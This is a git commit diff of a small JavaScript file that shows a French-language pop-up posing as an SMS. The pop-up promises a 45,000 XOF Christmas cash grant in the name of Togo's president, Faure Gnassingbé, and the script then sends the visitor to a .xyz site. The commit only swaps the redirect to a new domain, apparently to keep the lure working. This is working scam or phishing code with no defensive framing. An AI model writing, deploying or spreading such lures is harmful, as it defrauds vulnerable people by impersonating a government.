b3271407ad2ec07def35a82a0669992f0437b374
bigetijazz17 <bigetijazz17@gmail.com>
2024-11-30 16:32:26 -0800

    Update togogrant.js

--- togogrant.js
+++ togogrant.js
@@ -2,5 +2,5 @@
 var password = 'RECLAMER 45,000 XOF'
 password=prompt('SMS: Félicitations, vous êtes admissible à FAURE GNASSINGBÉ 45,000 XOF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 XOF');
 if (password != 'RECLAMER 45,000 XOF') {
-location.href='https://www.lib-legit.xyz/Retirer-45000XOF';
+location.href='https://www.reel-offer.xyz/Retirer-45000XOF';
 }
